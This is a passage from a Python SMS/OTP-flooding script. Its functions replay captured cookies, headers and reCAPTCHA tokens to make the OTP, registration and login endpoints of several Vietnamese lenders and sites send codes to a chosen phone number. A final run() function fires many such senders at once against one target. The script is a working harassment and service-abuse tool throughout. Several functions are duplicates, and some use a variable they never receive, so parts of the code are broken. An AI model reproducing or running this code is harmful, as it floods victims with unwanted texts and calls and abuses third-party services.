Safari/537.36\r\n------WebKitFormBoundaryslAwQvBBdWAJsg2D\r\nContent-Disposition: form-data; name="deviceType"\r\n\r\ndesktop\r\n------WebKitFormBoundaryslAwQvBBdWAJsg2D--\r\n'

    response = requests.post('https://sso.tuoitre.vn/register-v2', cookies=cookies, headers=headers, data=data)
def vdh17():
    headers = {
        'authority': 'api.f88.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-encoding': 'gzip',
        'content-type': 'application/json',
        'origin': 'https://online.f88.vn',
        'referer': 'https://online.f88.vn/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'phoneNumber': phone,
        'recaptchaResponse': '03AFcWeA5Xk5uQwzytNmeRAdXNqo6C8-taRHAeM-C8okqwp7iMg-hC6ZlFc7o3at8-c4X931eIy09BzhG627WJ92yifmtuAxDkvwKgeR87ZfTOE_4K7yFpb7B1xFMPmuzAgtJYR-SkNTYiEbvsFEN5PUhAa-wlZk790si3lwlDX0b4A0sdg4dqn-ZwDvIokJ37ixzgIRSTRns8t88DWt2l8umEH82Rzxjixt23ItbLUYQIa1GH3qqOEkhJTxa44kp-9ZJOjf0pM_aL621tZqBOmIgsHqmcV7w6rJCcdyCkcBEUeAMV3peuT36xwBv38ecey7_65Vz4XY8uE1-h_GMXFjs8Y7s-y4aquUzq2ST2F-QlpUKpIf02q7jMpzxnBv7oJL34troOAeB60IE7UBGRJXZJhfxuYr_Ov4R4AQX0FSKS0geqo2pmRMvFF3yyfesZywElSG4P3j1po1rO6GwhhaJVSbh8VJJBOIUgmWL-V5diabn-rrLHDHmHRoDNky3l_nw612rMcj2JU7wVou7sCFvHFX13rZrHHEsoUZqa75BPH7YFtMTgyJB8c_WPWtkyp-YqEMJyfN9f8J9F8RU-RZqqvOAsTggGug',
        'source': 'Online',
    }

    response = requests.post('https://api.f88.vn/growth/appvay/api/onlinelending/VerifyOTP/sendOTP', headers=headers, json=json_data)
def vdh18(sdt):
    cookies = {
        '_gid': 'GA1.2.1794681595.1696862619',
        '_gat_UA-214880719-1': '1',
        '_ga_RRJDDZGPYG': 'GS1.1.1696862619.1.1.1696862632.47.0.0',
        '_ga': 'GA1.1.1910799487.1696862619',
    }

    headers = {
        'authority': 'api.dongplus.vn',
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        # 'cookie': '_gid=GA1.2.1794681595.1696862619; _gat_UA-214880719-1=1; _ga_RRJDDZGPYG=GS1.1.1696862619.1.1.1696862632.47.0.0; _ga=GA1.1.1910799487.1696862619',
        'origin': 'https://dongplus.vn',
        'referer': 'https://dongplus.vn/user/login',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post(
        'https://api.dongplus.vn/api/user/send-one-time-password',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def vdh19(sdt):
    cookies = {
        '_gid': 'GA1.2.1794681595.1696862619',
        '_gat_UA-214880719-1': '1',
        '_ga_RRJDDZGPYG': 'GS1.1.1696862619.1.1.1696862632.47.0.0',
        '_ga': 'GA1.1.1910799487.1696862619',
    }

    headers = {
        'authority': 'api.dongplus.vn',
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        # 'cookie': '_gid=GA1.2.1794681595.1696862619; _gat_UA-214880719-1=1; _ga_RRJDDZGPYG=GS1.1.1696862619.1.1.1696862632.47.0.0; _ga=GA1.1.1910799487.1696862619',
        'origin': 'https://dongplus.vn',
        'referer': 'https://dongplus.vn/user/login',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post(
        'https://api.dongplus.vn/api/user/send-one-time-password',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def vdh20(sdt):
    cookies = {
        '_gcl_au': '1.1.1809435067.1696739941',
        '_tt_enable_cookie': '1',
        '_ttp': 'CIUoyacsdO8Ydz1SJu7glLAeUWO',
        '_fbp': 'fb.1.1696739941662.159133482',
        '_ym_uid': '1696739942336717250',
        '_ym_d': '1696739942',
        '_ga_P2783EHVX2': 'GS1.1.1696862851.2.0.1696862851.60.0.0',
        '_ga': 'GA1.2.793830112.1696739941',
        '_gid': 'GA1.2.592580676.1696862851',
        '_gat_UA-151110385-1': '1',
        '_ym_isad': '2',
        '_ym_visorc': 'b',
    }

    headers = {
        'authority': 'api.vayvnd.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=utf-8',
        # 'cookie': '_gcl_au=1.1.1809435067.1696739941; _tt_enable_cookie=1; _ttp=CIUoyacsdO8Ydz1SJu7glLAeUWO; _fbp=fb.1.1696739941662.159133482; _ym_uid=1696739942336717250; _ym_d=1696739942; _ga_P2783EHVX2=GS1.1.1696862851.2.0.1696862851.60.0.0; _ga=GA1.2.793830112.1696739941; _gid=GA1.2.592580676.1696862851; _gat_UA-151110385-1=1; _ym_isad=2; _ym_visorc=b',
        'origin': 'https://vayvnd.vn',
        'referer': 'https://vayvnd.vn/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
        'utm': [],
        'sourceSite': 3,
        'regScreenResolution': {
            'width': 1920,
            'height': 1080,
        },
    }

    response = requests.post('https://api.vayvnd.vn/v2/users', cookies=cookies, headers=headers, json=json_data) 
def vdh21(sdt):
    cookies = {
        '_gcl_au': '1.1.1809435067.1696739941',
        '_tt_enable_cookie': '1',
        '_ttp': 'CIUoyacsdO8Ydz1SJu7glLAeUWO',
        '_fbp': 'fb.1.1696739941662.159133482',
        '_ym_uid': '1696739942336717250',
        '_ym_d': '1696739942',
        '_ga_P2783EHVX2': 'GS1.1.1696862851.2.0.1696862851.60.0.0',
        '_ga': 'GA1.2.793830112.1696739941',
        '_gid': 'GA1.2.592580676.1696862851',
        '_gat_UA-151110385-1': '1',
        '_ym_isad': '2',
        '_ym_visorc': 'b',
    }

    headers = {
        'authority': 'api.vayvnd.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=utf-8',
        # 'cookie': '_gcl_au=1.1.1809435067.1696739941; _tt_enable_cookie=1; _ttp=CIUoyacsdO8Ydz1SJu7glLAeUWO; _fbp=fb.1.1696739941662.159133482; _ym_uid=1696739942336717250; _ym_d=1696739942; _ga_P2783EHVX2=GS1.1.1696862851.2.0.1696862851.60.0.0; _ga=GA1.2.793830112.1696739941; _gid=GA1.2.592580676.1696862851; _gat_UA-151110385-1=1; _ym_isad=2; _ym_visorc=b',
        'origin': 'https://vayvnd.vn',
        'referer': 'https://vayvnd.vn/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
        'utm': [],
        'sourceSite': 3,
        'regScreenResolution': {
            'width': 1920,
            'height': 1080,
        },
    }

    response = requests.post('https://api.vayvnd.vn/v2/users', cookies=cookies, headers=headers, json=json_data) 

def vdh22(sdt):
    cookies = {
        '_gcl_au': '1.1.1605201530.1697100677',
        '_tt_enable_cookie': '1',
        '_ttp': 'sd_ABtboFuIna5H0eEEwJakaz4N',
        '_fbp': 'fb.2.1697100678672.2140738242',
        'afUserId': '323e4985-dd69-4b93-8739-3e1d62e020d3-p',
        '.AspNetCore.Antiforgery.iDxHxxTbyew': 'CfDJ8DVMx7rRkFpJpsz5RKDfFWoDvMJjouUCOw55_1Et0qLp2Gn54vZKUGmTMmv5JDFhSF857-AtXr2-FxzWq7LgVTLrBPrDKrOX3nsz7hVWNKJK2T_5EY4R9Q58nHGmfiHtAtHlI1DAlgD_U2pyZ91ArsU',
        'MC.WEB.PORTAL': 'CfDJ8DVMx7rRkFpJpsz5RKDfFWp8CGaZiWDRolUZWPBTM8i24eYj8dOcU1WWFycLSUhYyPVuK38IfoErf%2FBukD53FosOOcvv1TJfj8bGqBi6Dl%2BcKr%2FWdjYvyrSA9udcQYJG6SCR4dJwzL0cm7WWBnFCvuqyjitysVDswrbhaXCkLMgK',
        '_ga_TTZGWP0RXB': 'GS1.1.1700216508.2.0.1700216508.0.0.0',
        '_ga_XS831VGKPD': 'GS1.1.1700216508.2.0.1700216508.60.0.0',
        '_ga': 'GA1.3.2136226874.1697100678',
        '_gid': 'GA1.3.439833227.1700216509',
        '_gat_UA-215142412-1': '1',
        '__zi': '3000.SSZzejyD5TqvZ_IesKOIso2FuQcMH4R5Re7vwifMJDfym-lysHqJd7x8hxVQ71kOUeUlijTL6vnxWwYoDp4q.1',
        'AF_SYNC': '1700216511462',
    }

    headers = {
        'authority': 'mcredit.com.vn',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json; charset=UTF-8',
        # 'cookie': '_gcl_au=1.1.1605201530.1697100677; _tt_enable_cookie=1; _ttp=sd_ABtboFuIna5H0eEEwJakaz4N; _fbp=fb.2.1697100678672.2140738242; afUserId=323e4985-dd69-4b93-8739-3e1d62e020d3-p; .AspNetCore.Antiforgery.iDxHxxTbyew=CfDJ8DVMx7rRkFpJpsz5RKDfFWoDvMJjouUCOw55_1Et0qLp2Gn54vZKUGmTMmv5JDFhSF857-AtXr2-FxzWq7LgVTLrBPrDKrOX3nsz7hVWNKJK2T_5EY4R9Q58nHGmfiHtAtHlI1DAlgD_U2pyZ91ArsU; MC.WEB.PORTAL=CfDJ8DVMx7rRkFpJpsz5RKDfFWp8CGaZiWDRolUZWPBTM8i24eYj8dOcU1WWFycLSUhYyPVuK38IfoErf%2FBukD53FosOOcvv1TJfj8bGqBi6Dl%2BcKr%2FWdjYvyrSA9udcQYJG6SCR4dJwzL0cm7WWBnFCvuqyjitysVDswrbhaXCkLMgK; _ga_TTZGWP0RXB=GS1.1.1700216508.2.0.1700216508.0.0.0; _ga_XS831VGKPD=GS1.1.1700216508.2.0.1700216508.60.0.0; _ga=GA1.3.2136226874.1697100678; _gid=GA1.3.439833227.1700216509; _gat_UA-215142412-1=1; __zi=3000.SSZzejyD5TqvZ_IesKOIso2FuQcMH4R5Re7vwifMJDfym-lysHqJd7x8hxVQ71kOUeUlijTL6vnxWwYoDp4q.1; AF_SYNC=1700216511462',
        'origin': 'https://mcredit.com.vn',
        'referer': 'https://mcredit.com.vn/',
        'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'phone': phone,
        'recaptchaToken': '03AFcWeA5ky51Fe1re7DMT-UdDOr4WIuLLvV27EyPmEHyMUV1Z4EFN_yEg4su8tb6mCBNbrWYQJkxxYgyY_SPG8w4JbIfmybpAPak3B6oEjSCkWst__3FGMv1CQeXPmurLhLUgr_sX5V-MBtm3fitXpU7_8nHgvfcfJF-K9hQjSa02kBHpDGV47s3kIogDZJUJygETypomIlgjmpKuotXNElHM5PPFMvPq9dGeuiRu7qTG32FTQraYHHFHU33G7uLnGgVV-8Iml9vj-HDXflnLUyzWUOAF6SePRMfUW_YZONhfnIb1Qvm9ZUb6q7jknYkpCXamie8ueDI9kB4bqcGFHkbiysn8QbPsuWRg2uWZJthLhBfMRnP3A_2FNOxkn3vzta-t5MYr1HKiiPsXE4thNhgkzqa_kWS96wv-i07WhN_8nMusrQJxJOhxth8SMWpG_1zwJ3u-mPOtZ-3asbPGV6H-CzbN8qalkNkhoddS4qPQJ9n_jUvV6T5SuNIynjyBzR5ljd2C3oidsu9kymoDCD3LujbWCcCo86Acv__GmbE9bOAC4oyxq_wkDBZkBzjxOwJm5jfM02OnKMdVOpwu2sE8QrDq42B8aiiFzRzSQimTW7A2JfZE09RvV5gYNIlrPr9cGyvg5fNdfZLKHwZgqnho_MRWd7LkQqDyS5DPjF0zqB-bP8FNzIlDh5MAp5PFPRQD72GdCjQD7t7GcIaHDL3KcZ7B_9Ixd34H7Pap1kKBeQ2_Q3BKJ4bA4h37DZppMT99R4q2m2o_Ur14HawF56JniiJZj2cgDdLMqBH1nhabfmw--OYkaNAbD0QRohtEkRB4cSua8QAE6NQ9JGdiBPEW90I-mPNSrcSMPc86OTpuDj_XQnVFFzvUx_B0kyVGOOlLrFNyuUnfTqAfYJg1vdQswN6Pj_ozS2oWVcqs2Yr7jh4caABn2xirKMErkIZGrQEpfosFl3TORx0FJVqZGmdibARoodx4dTyV2sJes4TQ5Xq0Ea7s2-4LDHOJXZCJd_EomAmrD8h3DfNB8WwIZzIkjkRdAGLaOS_KUqPxnrgoG_HJNH0F99Bihjz3beXKhuBKxGsMjmDdjn25EJtUDbu3lVj1-1_ZOQYR0HpJpP0Pjy4loA4xryrq0nYnCRbveASTX6AuV11ai1ATJqTtZbr0Tsw4Z6QISMkHkWjejPtf28Wpc6ibacqYfy-B-4j90EQGAKtB9c4g_bwqLKHgnCiD8o7ZPQQCEUthuEIQFvvRP5G-ymFGyP3J5BjbTDfsL0dbogYVyYMbrWa8CgVA9XE1VkJvH4DhRb4a9np3N-C5iN1k-pKI2s6xIMyFHU9fvYj_7xB-3mu1Rug694zj8LDh0HOqu09MjcoS4ThoCMAYL-vT21sekDFeg_6uYiYtGTJAgGYeLDQy7tlvAW0PpIlXvA9kwpBxa3LZ7rPqU17dZMx6Sv88fYNDUM88bmnfKM1OHeg5uLkHH_IeLsn_HFSHIfOtGa4y8_HMU-RcqwGj_41e_1-Kku7pyHgQYAgcylP_V9r9CeKNxcbL87Midq0fKti2wRjm1sBw6L6nMuiJJ7ZbvY_EdKyof-mRnYsQIDpw3BSYYnuMOwVCC12iIGwCI113j_fCQQPba2-crKEJg2YGvU9cI8PXdDtlHbn0k-UGPh98zLMJ',
    }

    response = requests.post('https://mcredit.com.vn/api/Customers/requestOTP', cookies=cookies, headers=headers, json=json_data)
def vdh23(sdt):
    cookies = {
        'url_log': 'https%3A%2F%2Fdoctordong.vn%2F',
        'utm_source_true_sec': 'amtQSVlhei9iVWJCalI3L0hnR2lXQT09LS1mZlNOc3psVTNvWTJVeGkzM2RWZjd3PT0%3D--2ade89b3be31af4c67a50464a4bdbddab084ac20',
        'utm_medium_true_sec': 'WUxHUis4bnJZUlpmdnRLbUZPN2xRdz09LS1QN0JvZEM0Mk9SRm9yNVl2WkVyZm1RPT0%3D--10d21b701298e0dae56622f01b5e258f30cf4d3c',
        'cet': 'VWx4YU1Cbk1sV3E1L1MzQXAreE5xRmVvNzVYVGozL2trejJLd1FIZ2FaMD0tLUNvbThDc0ErcTgvSmVUQ29UZFAvdUE9PQ%3D%3D--bced897dc0165f975938206957c1520114e211c7',
        'utm_source_sec': 'cU9RWmNyeVhoS3BDTkJFbmFoTmxnQT09LS1YcEswRDkrSkZWa1FCN0xieXIvVitRPT0%3D--57120247df0564352460d42f4522ed0122f3df7c',
        'utm_medium_sec': 'ZENXc0Y0VG5WMHgzaU45MzJmbmc5Zz09LS1SRjNBNXdaMzBCcnMyUUhtRC9YT3F3PT0%3D--1364f13156c9da4415a7a01e92f1bf90b305719c',
        '__cfruid': 'ca80a4e4f03e14f9e3eed7cad547aab73a30d9e4-1700216938',
        '_cfuvid': 'pP0vBN_60GItuJVZ9ZoEFjFE_VINkEI7BFGFrLfTNt0-1700216938833-0-604800000',
        'watchingTime': '1700216959',
        '_vwo_uuid_v2': 'D7084F916E965784A30D4FE8430789B36|c50a89d43e3ba1e1e62872a267c71a3b',
        'cf_clearance': 'FXE9P5E0rggSTIoJQHPPpWdL9qtTiktYwgxFfhAR2d8-1700216941-0-1-21c26587.c78f4e45.76c33a67-0.2.1700216941',
        '_pk_ref.20.6db0': '%5B%22%22%2C%22%22%2C1700216960%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
        '_pk_id.20.6db0': '7b60e0df7d9d9cd9.1700216960.',
        '_pk_ses.20.6db0': '1',
        '_fbp': 'fb.1.1700216961216.1659786824',
        '_clck': 'ufzw56%7C2%7Cfgs%7C0%7C1416',
        '_gcl_au': '1.1.214211249.1700216962',
        '_gid': 'GA1.2.1722834176.1700216962',
        '_gat_%5Bobject%20Object%5D': '1',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_2428610': '0',
        '_hjSession_2428610': 'eyJpZCI6ImRiYjBkYWE2LTZiZGItNDhiMS05Mjk0LTU1ZmVkOWExYzQwMyIsImNyZWF0ZWQiOjE3MDAyMTY5NjIyNDUsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9',
        '_hjAbsoluteSessionInProgress': '0',
        'timeToPressBorrow': '4',
        'product_code_sec': 'VWNya3VheWJJcmpUM3BISXVOVUtPdz09LS1NdDZnU28zdktYL0ZaTzY0QThmc0hnPT0%3D--3de707188e355c4676e1579d1c31b4fc9ee2c09d',
        '_doctordong_session': 'MVF4dU4ya3JmV0dSS0szRFk1aU9OYUJCVmF5YVRFb2NackwybW5jZHRhODQ1ZjZmMUR2dWFDZElpaFVkY2hGK0JzbjJROWZ3N1RESk8xY3o4amowZXlHY0lGd2NSakNiRHk2QnUxVUJ2ekVXYndhY3pZOGQ0MjFtM1RLcWJqZDg5VjFlNU9ITEt1bG1xb29lVVVuNEo3VHQzWFEzNTNyTlVOcFoyQUhnVDlwNm9PUXZsbnRET09UZlNocVM0em9obDQvSlk3eGRnczBTZnR0bmN6QTFzcWtkOS84VzFHeUZ5S2wzNHZFYnRUVk12Wktid3BXcXlsV2hSUURDOFpTRndMcGYzeDZDRHcxRFdma2l0dHpIWkE5UVYvMkpyMU8zV3pMRWdzTzVveEJEM1owQldHWUZWcUczMWRlcFZKbHQtLXN1V0ZsSkR4UVFodXA4eWF0S1JFMGc9PQ%3D%3D--f741f956961fb998eb61822c8517ac8fc9a0d99e',
        'timeToPressOTP': '1700216963',
        '_ga': 'GA1.2.565659439.1700216961',
        '_hjSessionUser_2428610': 'eyJpZCI6ImFiZTdhNmFiLTI0ZjAtNTc4Ni1iZGFmLTE2ODllMGYzZGIxNSIsImNyZWF0ZWQiOjE3MDAyMTY5NjIyNDIsImV4aXN0aW5nIjp0cnVlfQ==',
        '_clsk': 'cwz1p2%7C1700216964047%7C2%7C1%7Cr.clarity.ms%2Fcollect',
        '_ga_NR1YL6WXNN': 'GS1.1.1700216960.1.1.1700216968.0.0.0',
        'mobileInputTimeLK': '1700216970',
    }

    headers = {
        'authority': 'doctordong.vn',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'url_log=https%3A%2F%2Fdoctordong.vn%2F; utm_source_true_sec=amtQSVlhei9iVWJCalI3L0hnR2lXQT09LS1mZlNOc3psVTNvWTJVeGkzM2RWZjd3PT0%3D--2ade89b3be31af4c67a50464a4bdbddab084ac20; utm_medium_true_sec=WUxHUis4bnJZUlpmdnRLbUZPN2xRdz09LS1QN0JvZEM0Mk9SRm9yNVl2WkVyZm1RPT0%3D--10d21b701298e0dae56622f01b5e258f30cf4d3c; cet=VWx4YU1Cbk1sV3E1L1MzQXAreE5xRmVvNzVYVGozL2trejJLd1FIZ2FaMD0tLUNvbThDc0ErcTgvSmVUQ29UZFAvdUE9PQ%3D%3D--bced897dc0165f975938206957c1520114e211c7; utm_source_sec=cU9RWmNyeVhoS3BDTkJFbmFoTmxnQT09LS1YcEswRDkrSkZWa1FCN0xieXIvVitRPT0%3D--57120247df0564352460d42f4522ed0122f3df7c; utm_medium_sec=ZENXc0Y0VG5WMHgzaU45MzJmbmc5Zz09LS1SRjNBNXdaMzBCcnMyUUhtRC9YT3F3PT0%3D--1364f13156c9da4415a7a01e92f1bf90b305719c; __cfruid=ca80a4e4f03e14f9e3eed7cad547aab73a30d9e4-1700216938; _cfuvid=pP0vBN_60GItuJVZ9ZoEFjFE_VINkEI7BFGFrLfTNt0-1700216938833-0-604800000; watchingTime=1700216959; _vwo_uuid_v2=D7084F916E965784A30D4FE8430789B36|c50a89d43e3ba1e1e62872a267c71a3b; cf_clearance=FXE9P5E0rggSTIoJQHPPpWdL9qtTiktYwgxFfhAR2d8-1700216941-0-1-21c26587.c78f4e45.76c33a67-0.2.1700216941; _pk_ref.20.6db0=%5B%22%22%2C%22%22%2C1700216960%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.20.6db0=7b60e0df7d9d9cd9.1700216960.; _pk_ses.20.6db0=1; _fbp=fb.1.1700216961216.1659786824; _clck=ufzw56%7C2%7Cfgs%7C0%7C1416; _gcl_au=1.1.214211249.1700216962; _gid=GA1.2.1722834176.1700216962; _gat_%5Bobject%20Object%5D=1; _hjFirstSeen=1; _hjIncludedInSessionSample_2428610=0; _hjSession_2428610=eyJpZCI6ImRiYjBkYWE2LTZiZGItNDhiMS05Mjk0LTU1ZmVkOWExYzQwMyIsImNyZWF0ZWQiOjE3MDAyMTY5NjIyNDUsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9; _hjAbsoluteSessionInProgress=0; timeToPressBorrow=4; product_code_sec=VWNya3VheWJJcmpUM3BISXVOVUtPdz09LS1NdDZnU28zdktYL0ZaTzY0QThmc0hnPT0%3D--3de707188e355c4676e1579d1c31b4fc9ee2c09d; _doctordong_session=MVF4dU4ya3JmV0dSS0szRFk1aU9OYUJCVmF5YVRFb2NackwybW5jZHRhODQ1ZjZmMUR2dWFDZElpaFVkY2hGK0JzbjJROWZ3N1RESk8xY3o4amowZXlHY0lGd2NSakNiRHk2QnUxVUJ2ekVXYndhY3pZOGQ0MjFtM1RLcWJqZDg5VjFlNU9ITEt1bG1xb29lVVVuNEo3VHQzWFEzNTNyTlVOcFoyQUhnVDlwNm9PUXZsbnRET09UZlNocVM0em9obDQvSlk3eGRnczBTZnR0bmN6QTFzcWtkOS84VzFHeUZ5S2wzNHZFYnRUVk12Wktid3BXcXlsV2hSUURDOFpTRndMcGYzeDZDRHcxRFdma2l0dHpIWkE5UVYvMkpyMU8zV3pMRWdzTzVveEJEM1owQldHWUZWcUczMWRlcFZKbHQtLXN1V0ZsSkR4UVFodXA4eWF0S1JFMGc9PQ%3D%3D--f741f956961fb998eb61822c8517ac8fc9a0d99e; timeToPressOTP=1700216963; _ga=GA1.2.565659439.1700216961; _hjSessionUser_2428610=eyJpZCI6ImFiZTdhNmFiLTI0ZjAtNTc4Ni1iZGFmLTE2ODllMGYzZGIxNSIsImNyZWF0ZWQiOjE3MDAyMTY5NjIyNDIsImV4aXN0aW5nIjp0cnVlfQ==; _clsk=cwz1p2%7C1700216964047%7C2%7C1%7Cr.clarity.ms%2Fcollect; _ga_NR1YL6WXNN=GS1.1.1700216960.1.1.1700216968.0.0.0; mobileInputTimeLK=1700216970',
        'downlink': '10',
        'origin': 'https://doctordong.vn',
        'referer': 'https://doctordong.vn/clients/auth/sign_in',
        'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'sec-ch-ua-arch': '"x86"',
        'sec-ch-ua-full-version-list': '"Google Chrome";v="119.0.6045.124", "Chromium";v="119.0.6045.124", "Not?A_Brand";v="24.0.0.0"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"10.0.0"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'x-csrf-token': '8SYuJduHMT42rDOOwNsCTriTQKMf5bUdfMSO50cKN/P1JvsHFxnQAnYtZxHFVv2DQpGcLT2mmPdlkA/6kFW4WQ==',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone_number': phone,
        'webdriver': 'false',
        'max_touch_points': '0',
        'user_agent_data': '{"brands":[{"brand":"Google Chrome","version":"119"},{"brand":"Chromium","version":"119"},{"brand":"Not?A_Brand","version":"24"}],"mobile":false,"platform":"Windows"}',
    }

    response = requests.post('https://doctordong.vn/clients/auth/otp', cookies=cookies, headers=headers, data=data)
def vdh24(sdt):
    cookies = {
        '_gcl_au': '1.1.1809435067.1696739941',
        '_tt_enable_cookie': '1',
        '_ttp': 'CIUoyacsdO8Ydz1SJu7glLAeUWO',
        '_fbp': 'fb.1.1696739941662.159133482',
        '_ym_uid': '1696739942336717250',
        '_ym_d': '1696739942',
        '_ga_P2783EHVX2': 'GS1.1.1700217286.3.0.1700217286.60.0.0',
        '_ga': 'GA1.2.793830112.1696739941',
        '_gid': 'GA1.2.1845910826.1700217287',
        '_gat_UA-151110385-1': '1',
        '_ym_isad': '2',
        '_ym_visorc': 'w',
    }

    headers = {
        'authority': 'api.vayvnd.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=utf-8',
        # 'cookie': '_gcl_au=1.1.1809435067.1696739941; _tt_enable_cookie=1; _ttp=CIUoyacsdO8Ydz1SJu7glLAeUWO; _fbp=fb.1.1696739941662.159133482; _ym_uid=1696739942336717250; _ym_d=1696739942; _ga_P2783EHVX2=GS1.1.1700217286.3.0.1700217286.60.0.0; _ga=GA1.2.793830112.1696739941; _gid=GA1.2.1845910826.1700217287; _gat_UA-151110385-1=1; _ym_isad=2; _ym_visorc=w',
        'origin': 'https://vayvnd.vn',
        'referer': 'https://vayvnd.vn/',
        'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
        'utm': [],
        'sourceSite': 3,
        'regScreenResolution': {
            'width': 1920,
            'height': 1080,
        },
        'trackingId': 'UGFh74c7N52ZYXhkpolKiqp4aAKd8dIQewDvW3jyAKvcFHSlOPjHnqejm6gIh2KO',
    }

    response = requests.post('https://api.vayvnd.vn/v2/users', cookies=cookies, headers=headers, json=json_data)


                                                                 
def run(sdt,i):                  
  threading.submit(tv360,sdt)#1
  threading.submit(winmart,sdt)#2
  threading.submit(apispam,sdt)#3
  threading.submit(vieon,sdt)#4
  threading.submit(poyeye,sdt)#5
  threading.submit(alfrescos,sdt)#6
  threading.submit(fpt,sdt)#7
  threading.submit(kiot,sdt)#8
  threading.submit(vayvnd,sdt)#9
  threading.submit(viettel,sdt)#10
  threading.submit(tamo,sdt)#11 
  threading.submit(meta,sdt)#12
  threading.submit(funring,sdt)#13
  threading.submit(dkvt,sdt)#14
  threading.submit(fptplay,sdt)
  threading.submit(vietid,sdt)
  threading.submit(zlpay,sdt) 
  threading.submit(momo,sdt) 
  threading.submit(fpt,sdt)
  threading.submit(call3,sdt)
  threading.submit(call2,sdt)
  threading.submit(call1,sdt)
  threading.submit(call4,sdt)
